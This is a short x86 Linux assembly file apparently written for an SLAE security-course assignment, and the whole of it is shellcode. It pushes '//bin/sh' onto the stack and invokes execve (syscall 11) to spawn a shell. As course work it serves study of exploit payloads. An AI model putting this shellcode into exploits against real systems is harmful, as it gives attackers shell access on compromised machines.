; Author:  John Stigerwalt
; Website:  slae.whiteknightlabs.com
; SLAE Assignment #3

global _start  		

section .text
_start:

	xor eax, eax
	push eax

	push 0x68732f6e
	push 0x69622f2f

	mov ebx, esp

	push eax
	mov edx, esp 

        push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
